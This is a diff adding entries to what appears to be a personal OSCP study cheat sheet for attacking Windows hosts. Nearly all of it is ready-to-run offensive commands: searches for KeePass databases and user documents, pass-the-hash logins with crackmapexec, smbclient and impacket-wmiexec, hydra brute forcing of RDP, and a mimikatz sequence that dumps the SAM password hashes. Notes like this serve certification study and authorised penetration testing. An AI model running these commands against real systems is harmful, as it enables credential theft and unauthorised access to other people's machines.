@@ -4,6 +4,30 @@ Port scan for Win:
 nmap -sC -sV -A -Pn -p 53,88,135,139,445 $TARGET_IP -vv
 ```
 
+OSCP guidance for enumeration:
+---
+#oscp #windows-enum #pen-200
+```powershell
+whoami /groups
+powershell
+Get-LocalUser
+Get-LocalGroup
+Get-LocalGroupMember "$GROUP"
+systeminfo
+ipconfig /all
+route print
+netstat -ano
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+Get-Process # or tasklist /SVC
+Get-Process | findstr /V /R "svchost winlogon vm3dservice RuntimeBroker vmtoolsd SearchHost lsass"
+```
+
+```powershell
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users\$USER\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+```
+
 Check OS architecture / version:
 ```powershell
 ver
@@ -104,10 +128,25 @@ Mount windows share:
 sudo mount -o username=$USER,password=$PASSWORD -t cifs \\\\$TARGET_IP\$SHARE /mnt
 ```
 
+wmiexec with hash:
+#pass-the-hash #pth 
+```bash
+crackmapexec smb -u administrator -H $HASH -X "powershell -e ..."
+```
+smbclient:
+#pass-the-hash 
+```bash
+smbclient \\\\$TARGET_IP\\$SHARE -U Administrator --pw-nt-hash $HASH
+```
+
 Try to connect to console:
 
 ```shell
 impacket-psexec $USER:$PASSWORD@$TARGET_IP
+```
+
+```bash
+impacket-wmiexec -hashes :$NTLM$ Administrator@$TARGET_IP
 ```
 
 ```shell
@@ -123,8 +162,35 @@ crackmapexec winrm $TARGET_IP -u $USER -p $PASSWORD
 ```
 
 
-Port 3389 RDP:
+Port 3389 RDP with clipboard enabled:
 
-```sh
-xfreerdp /v:$TARGET_IP /u:$USER
+```bash
+xfreerdp +clipboard /v:$TARGET_IP /u:$USER
+```
+
+Connect with shared folder, and NLA :
+```bash
+xfreerdp +clipboard /v:$TARGET_IP /sec:nla /u:$USER /p:$PASSWORD /drive:shared,/home/kali/shared
+```
+
+Brute force RDP:
+
+```bash
+hydra -L /usr/share/wordlists/dirb/others/names.txt -p $PASSWORD rdp://$TARGET_IP -I
+```
+
+Check FS for keepass files:
+
+```powershell
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
+
+
+mimikatz dump as local admin:
+#dump #mimikatz
+```powershell
+.\mimikatz
+privilege::debug
+token::elevate
+lsadump::sam
 ```
